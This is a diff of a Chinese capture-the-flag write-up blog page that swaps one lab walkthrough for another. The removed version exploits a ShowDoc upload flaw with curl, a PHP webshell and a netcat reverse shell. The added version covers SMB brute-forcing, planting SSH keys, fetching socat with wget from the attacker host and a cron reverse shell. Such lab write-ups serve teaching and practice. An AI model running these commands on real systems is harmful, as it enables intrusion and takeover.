@@ -10,24 +10,38 @@
 <meta name="description" content="# 信息收集
 
 ```bash
-IP=192.168.205.202
+IP=192.168.205.203
 nmap -p0-65535 $IP
 ```
 
-开了 22 和 80，Apache on Debian，SSH 允许密码登录。">
-<meta property="og:title" content="内部_Show">
+```
+PORT    STATE SERVICE
+22/tcp  open  ssh
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+```
+
+只有 SSH 和 SMB，没有 Web 端口。">
+<meta property="og:title" content="内部_Acfun">
 <meta property="og:description" content="# 信息收集
 
 ```bash
-IP=192.168.205.202
+IP=192.168.205.203
 nmap -p0-65535 $IP
 ```
 
-开了 22 和 80，Apache on Debian，SSH 允许密码登录。">
+```
+PORT    STATE SERVICE
+22/tcp  open  ssh
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+```
+
+只有 SSH 和 SMB，没有 Web 端口。">
 <meta property="og:type" content="article">
-<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Show.html">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Acfun.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
-<title>内部_Show</title>
+<title>内部_Acfun</title>
 
 
 
@@ -60,7 +74,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 
 <body>
     <div id="header">
-<h1 class="postTitle">内部_Show</h1>
+<h1 class="postTitle">内部_Acfun</h1>
 <div class="title-right">
     <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
         <svg class="octicon" width="16" height="16">
@@ -68,7 +82,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
         </svg>
     </a>
     
-    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/299" target="_blank" class="btn btn-invisible circle" title="Issue">
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/300" target="_blank" class="btn btn-invisible circle" title="Issue">
         <svg class="octicon" width="16" height="16">
             <path id="pathIssue" fill-rule="evenodd"></path>
         </svg>
@@ -85,155 +99,114 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
-<pre lang="bash"><code>IP=192.168.205.202
+<pre lang="bash"><code>IP=192.168.205.203
 nmap -p0-65535 $IP
 </code></pre>
-<p>开了 22 和 80，Apache on Debian，SSH 允许密码登录。</p>
-<pre><code>PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
+<pre><code>PORT    STATE SERVICE
+22/tcp  open  ssh
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
 </code></pre>
-<p>直接上 Nuclei 扫一波。</p>
-<pre lang="bash"><code>nuclei -u http://$IP
+<p>只有 SSH 和 SMB，没有 Web 端口。直接从 SMB 入手。</p>
+<pre lang="bash"><code>enum4linux -a $IP
 </code></pre>
-<p>几个关键命中：</p>
-<pre><code>[CNVD-2020-26585] [http] [critical] http://192.168.205.202/Public//Uploads//2026-06-04//6a21767742475.txt
-[showdoc-panel] [http] [info] http://192.168.205.202/web/#/user/login
-[dockerfile-hidden-disclosure] [http] [medium] http://192.168.205.202/Dockerfile
+<p>关键信息一把捞出来了：主机名 ACFUN，允许匿名会话，Samba 用户 <code>leaf</code>，通过 RID cycling 还跑出一个隐藏的 Unix 用户 <code>xueli</code>。匿名可访问的共享只有一个 <code>public</code>。密码策略很松，最小5位，无复杂度，无锁定。</p>
+<pre lang="bash"><code>smbclient //$IP/public -N
+smb: \&gt; ls
+smb: \&gt; get ACF_Framework_Internal_Guide.pdf
 </code></pre>
-<p>ShowDoc 文档管理系统，直接中奖。CNVD-2020-26585 是 ShowDoc 的前台未授权任意文件上传，Nuclei 已经验证成功并上传了一个 txt 文件。</p>
-<h1>初始突破</h1>
-<h2>漏洞分析</h2>
-<p>翻了一下这个 CVE 对应的 GitHub PR（star7th/showdoc#1059），问题出在 <code>PageController.class.php</code> 第 150 行：</p>
-<pre lang="php"><code>$upload-&gt;allowExts = array('jpg', 'gif', 'png', 'jpeg');
+<p>共享里只有一个加密 PDF。</p>
+<pre lang="bash"><code>pdf2john ACF_Framework_Internal_Guide.pdf &gt; hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
 </code></pre>
-<p><code>allowExts</code> 不是 ThinkPHP <code>Upload</code> 类的合法属性，正确写法是 <code>exts</code>。属性名写错导致后缀限制完全失效，加上方法没调用 <code>$this-&gt;checkLogin()</code>，未登录就能传任意文件。</p>
-<h2>文件上传 GetShell</h2>
-<p>我一开始直接用 curl 传 php 文件，踩了几个坑。</p>
-<p>先试了 <code>/api/page/uploadImg</code> 路径：</p>
-<pre lang="bash"><code>curl -v -F &quot;editormd-image-file=@cmd.php;filename=shell.php;type=image/jpeg&quot; &quot;http://$IP/index.php?s=/api/page/uploadImg&quot;
+<p>PDF 密码秒破：<code>1234567890</code>。打开看内容，是一份内部技术备忘录，介绍 ACF（Alpine Configuration Framework）的部署方式，提到 <code>acf-core</code>、<code>acf-lib</code>、<code>haserl</code> 这几个包，作者邮箱 <code>leaf@acfun.dsz</code>。当时记下了两个信息：目标跑的是 Alpine Linux，有一个基于 Lua 和 haserl 的 Web 管理框架。</p>
+<h1>SMB 爆破与初始立足</h1>
+<p>PDF 密码 <code>1234567890</code> 拿去试 SSH，不行。既然密码策略这么弱，直接拿 rockyou 爆 SMB。</p>
+<pre lang="bash"><code>crackmapexec smb $IP -u leaf -p /usr/share/wordlists/rockyou.txt
 </code></pre>
-<p>返回了数据库不可写的错误：</p>
-<pre lang="json"><code>{&quot;error_code&quot;:&quot;10103&quot;,&quot;error_message&quot;:&quot;Sqlite\/showdoc.db.php\u6587\u4ef6\u4e0d\u53ef\u5199&quot;}
+<pre><code>SMB  192.168.205.203 445  ACFUN  [+] ACFUN\leaf:gothic
 </code></pre>
-<p>换成 <code>/home/page/uploadImg</code>，返回 200 但 Content-Length 为 0，一片空白。我当时有点懵，明明 Nuclei 能传上去。</p>
-<p>回头看 Nuclei 的模板文件，发现关键细节——filename 里带了 <code>&lt;&gt;</code> 符号：<code>filename=&quot;{{randstr}}.&lt;&gt;txt&quot;</code>。这个 <code>&lt;&gt;</code> 是绕过 ThinkPHP 过滤的技巧。照着模板格式构造：</p>
-<pre lang="bash"><code>curl -v -F 'editormd-image-file=@cmd.php;filename=cmd.&lt;&gt;php;type=text/plain' &quot;http://$IP/index.php?s=/home/page/uploadImg&quot;
+<p>拿到 <code>leaf:gothic</code>，但这个密码 SSH 也登不上去，应该是 SSH 禁了密码认证或者 leaf 不在 AllowUsers 里。</p>
+<pre lang="bash"><code>smbmap -H $IP -u leaf -p 'gothic'
 </code></pre>
-<p>这次成功了：</p>
-<pre lang="json"><code>{&quot;url&quot;:&quot;http:\/\/192.168.205.202\/Public\/Uploads\/2026-06-04\/6a2178ebd3f08.php&quot;,&quot;success&quot;:1}
+<pre><code>public    READ ONLY
+leaf      READ, WRITE   Home Directories
 </code></pre>
-<p><code>cmd.php</code> 的内容是一个简单的 webshell：</p>
-<pre lang="php"><code>GIF89a;
-&lt;?php 
-if(isset($_GET['a']) &amp;&amp; isset($_GET['b'])) {
-    $a = $_GET['a'];
-    $b = $_GET['b'];
-    $a($b);
-}
-?&gt;
+<p>leaf 的家目录通过 SMB 可读写。进去翻了一下，发现 <code>.ssh</code> 目录里有私钥。</p>
+<pre lang="bash"><code>smbclient //$IP/leaf -U leaf%gothic
+smb: \&gt; cd .ssh
+smb: \&gt; ls
+smb: \&gt; get id_ed25519
+smb: \&gt; get id_ed25519.pub
 </code></pre>
-<h2>反弹 shell</h2>
-<p>攻击机开监听：</p>
+<p>拿到了 leaf 的 SSH 私钥，但直接用它去连还是要求输密码。原因很简单，<code>.ssh</code> 目录里没有 <code>authorized_keys</code> 文件，公钥认证根本没配置。</p>
+<p>既然 SMB 对 leaf 家目录有写权限，直接把我 Kali 的公钥传上去当 <code>authorized_keys</code>。</p>
+<pre lang="bash"><code>smbclient //$IP/leaf -U leaf%gothic -c 'cd .ssh; put authorized_keys authorized_keys'
+</code></pre>
+<pre lang="bash"><code>ssh leaf@$IP
+</code></pre>
+<p>顺利拿到 leaf 的 shell。</p>
+<h1>横移到 xueli</h1>
+<p>登进去跑了 linpeas，Alpine 的 BusyBox 环境跟 linpeas 兼容性不太好，ps 命令疯狂报错，但还是捞到了关键信息。</p>
+<p>几个重要发现：</p>
+<ul>
+<li><code>/usr/bin/haserl-lua5.4</code> 有 SUID root 位</li>
+<li><code>127.0.0.1:443</code> 有 mini_httpd 在监听，跑的是 ACF Web 界面</li>
+<li><code>/etc/acf/passwd</code> 权限是 <code>root:xueli</code>，xueli 组可读</li>
+<li><code>/tmp</code> 挂载了 <code>nosuid,nodev</code></li>
+</ul>
+<p>SUID 的 haserl 是个很诱人的目标，但折腾了一阵发现 Linux 内核对脚本 shebang 不传递 SUID 位。命令行传 <code>--shell=lua</code> 参数虽然能执行 Lua 代码，但那样走的不是 SUID 路径，跑出来还是 leaf 权限。这条路暂时走不通。</p>
+<p>ACF 密码文件属于 <code>root:xueli</code> 组，leaf 读不了，得先横移到 xueli。</p>
+<p>试了一下用 leaf 的 SSH 私钥直接连 xueli，居然成了，xueli 的 <code>authorized_keys</code> 里配的就是 leaf 的公钥。</p>
+<pre lang="bash"><code>ssh xueli@127.0.0.1 -i ~/.ssh/id_ed25519
+</code></pre>
+<pre><code>xueli@Acfun:~$ id
+uid=1001(xueli) gid=1001(xueli) groups=1001(xueli)
+</code></pre>
+<h1>读取 ACF 密码并破解</h1>
+<pre lang="bash"><code>cat /etc/acf/passwd
+</code></pre>
+<pre><code>root:$5$rDkGkMAvv6FPpwRG$.gS5I9LcOiZDYGW598cgXDPEDvHI7GLl.UmVxgdyUQ0:Admin account:ADMIN
+</code></pre>
+<p>SHA-256-crypt 哈希，拉回 Kali 破解。</p>
+<pre lang="bash"><code>echo 'root:$5$rDkGkMAvv6FPpwRG$.gS5I9LcOiZDYGW598cgXDPEDvHI7GLl.UmVxgdyUQ0' &gt; hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+</code></pre>
+<pre><code>root:juggernaut
+</code></pre>
+<p>这是 ACF Web 界面的密码，不是系统 root 密码，拿去 <code>su root</code> 试了一下果然不行。</p>
+<h1>通过 ACF Web 提权</h1>
+<p>ACF 监听在 <code>127.0.0.1:443</code>，外部访问不到。靶机上没有 curl，上传了一个静态编译的 socat 做端口转发。</p>
+<pre lang="bash"><code>cd /tmp
+busybox wget 192.168.205.128/socat
+chmod +x socat
+./socat TCP-LISTEN:4443,fork TCP4:127.0.0.1:443 &amp;
+</code></pre>
+<p>浏览器访问 <code>https://192.168.205.203:4443</code>，用 <code>root:juggernaut</code> 登录 ACF 管理界面。</p>
+<p>界面功能不少，Networking、Packages、Init、Cron 都有。我直接奔着 Cron 的 Expert 编辑去了。ACF 的 CGI 通过 SUID 的 haserl 以 root 身份执行，意味着它能直接改 <code>/etc/crontabs/root</code>。</p>
+<p>原始 cron 内容：</p>
+<pre><code>*/15 * * * * run-parts /etc/periodic/15min
+0    * * * * run-parts /etc/periodic/hourly
+0    2 * * * run-parts /etc/periodic/daily
+0    3 * * 6 run-parts /etc/periodic/weekly
+0    5 1 * * run-parts /etc/periodic/monthly
+</code></pre>
+<p>在末尾加了一行反弹 shell：</p>
+<pre><code>* * * * * busybox nc 192.168.205.128 8888 -e /bin/bash
+</code></pre>
+<p>保存提交，Kali 上开好监听。</p>
 <pre lang="bash"><code>nc -lvnp 8888
 </code></pre>
-<p>通过 webshell 触发反弹：</p>
-<pre><code>http://192.168.205.202/Public/Uploads/2026-06-04/6a2178ebd3f08.php?a=exec&amp;b=busybox nc 192.168.205.128 8888 -e /bin/bash
+<p>等了一会没回来，不知道什么原因，可能 busybox crond 有缓存或者需要重新加载。直接重启靶机让 crond 重新读取 crontab，重启完几十秒 root shell 就回来了。</p>
+<pre><code>id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 </code></pre>
-<p>收到 shell，升级交互式终端：</p>
-<pre lang="bash"><code>script /dev/null -c bash
-</code></pre>
-<p>当前身份是 <code>www-data</code>。</p>
-<h1>横向移动</h1>
-<h2>凭据收集</h2>
-<p>翻 ShowDoc 的配置文件：</p>
-<pre lang="bash"><code>cat /var/www/html/server/Application/Common/Conf/config.php | grep DB_PWD
-</code></pre>
-<pre><code>'DB_PWD' =&gt; 'showdoc123456',
-</code></pre>
-<p>系统上有两个普通用户：</p>
-<pre lang="bash"><code>grep bash /etc/passwd
-</code></pre>
-<pre><code>root:x:0:0:root:/root:/bin/bash
-mooi:x:1000:1000:,,,:/home/mooi:/bin/bash
-l1qin9:x:1001:1001:,,,:/home/l1qin9:/bin/bash
-</code></pre>
-<h2>www-data 到 mooi</h2>
-<p>密码复用，直接 su：</p>
-<pre lang="bash"><code>su mooi
-</code></pre>
-<p>密码 <code>showdoc123456</code>，成功切换。</p>
-<h2>mooi 到 l1qin9</h2>
-<p>同样密码复用：</p>
-<pre lang="bash"><code>su l1qin9
-</code></pre>
-<p>密码 <code>showdoc123456</code>，拿到 l1qin9 的 shell。两个用户都没有 sudo 权限。</p>
-<h1>提权</h1>
-<h2>发现 SUID 程序</h2>
-<p>l1qin9 的 home 目录下有个不寻常的东西：</p>
-<pre lang="bash"><code>ls -la ~/auth_monitor
-</code></pre>
-<pre><code>-rwsr-sr-x 1 root root 16632 Apr 25 22:43 auth_monitor
-</code></pre>
-<p>SUID + SGID，root 属主，自定义二进制。跑起来看看行为：</p>
-<pre><code>--- MAZE-SEC ACCESS MONITOR ---
-SYSTEM_TICK: 1780578767
-CHALLENGE_STAMP: f01957e7
-ENTER ACCESS CODE:
-</code></pre>
-<p>要求输入一个 ACCESS CODE，输错就 ACCESS DENIED。输对了会以 root 身份读取 <code>/root/show.txt</code>。</p>
-<h2>逆向分析</h2>
-<p>用 strings 看到几个关键字符串：<code>/dev/urandom</code>、<code>CHALLENGE_STAMP</code>、<code>ACCESS DENIED</code>、<code>/root/show.txt</code>，还有一个有意思的符号名 <code>s0rand</code>。</p>
-<p>拉回来丢进反编译器，main 函数逻辑很清晰：</p>
-<pre lang="c"><code>// 从 /dev/urandom 读 4 字节作为 buf
-read(fd, &amp;buf, 4);
-
-// 用 buf 和 argv[0] 第一个字符算一个种子 v13
-for (i = 0; i &lt;= 99; i++) {
-    v13 += buf % (i + 1);
-    v13 ^= **argv;
-}
-
-// 设置随机种子
-s0rand(v13);
-v10 = rand();
-
-// 打印 CHALLENGE_STAMP（就是 buf 的十六进制）
-printf(&quot;CHALLENGE_STAMP: %08x\n&quot;, buf);
-
-// 要求输入，匹配则 setuid(0) 读 /root/show.txt
-scanf(&quot;%d&quot;, &amp;v7);
-if (v10 == v7) {
-    setuid(0); setgid(0);
-    // 读取并打印 /root/show.txt
-}
-</code></pre>
-<p>看上去需要根据 CHALLENGE_STAMP 推算出 rand() 的结果。种子计算还涉及 argv[0] 的第一个字符，有点麻烦。</p>
-<p>但翻到 <code>s0rand</code> 的实现，整个人就笑了：</p>
-<pre lang="c"><code>void s0rand() {
-    srand(0x539);  // 1337
-}
-</code></pre>
-<p>传入的参数完全被忽略，固定用 <code>srand(1337)</code>。也就是说不管 CHALLENGE_STAMP 是什么，<code>rand()</code> 的返回值永远是同一个数。</p>
-<h2>利用</h2>
-<p>一行搞定：</p>
-<pre lang="bash"><code>python3 -c &quot;import ctypes;l=ctypes.CDLL('libc.so.6');l.srand(1337);print(l.rand())&quot; | ./auth_monitor
-</code></pre>
-<pre><code>--- MAZE-SEC ACCESS MONITOR ---
-SYSTEM_TICK: 1780578767
-CHALLENGE_STAMP: f01957e7
-ENTER ACCESS CODE: 1NOjcN9b9uqUJ0VPYbgi
-</code></pre>
-<p>输出了 <code>/root/show.txt</code> 的内容，里面是 root 密码。直接 su：</p>
-<pre lang="bash"><code>su root
-</code></pre>
-<p>输入拿到的密码，切到 root。</p>
 <h1>Flag</h1>
-<pre lang="bash"><code>cat /home/mooi/user.txt
+<pre lang="bash"><code>cat /home/xueli/user.txt
 cat /root/root.txt
 </code></pre>
-<pre><code>flag{user-f5ce64ad520f46e2bcb1dc94dbb6dbd3}
-flag{root-64f26bcf00751fcbe2d03d5a7d7c93ef}
+<pre><code>flag{user-a7048bfa96c2a4bbd4fbf76465e645fb}
+flag{root-e0694a86a8214b57d9bc3f8dae30bf33}
 </code></pre>
 </div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
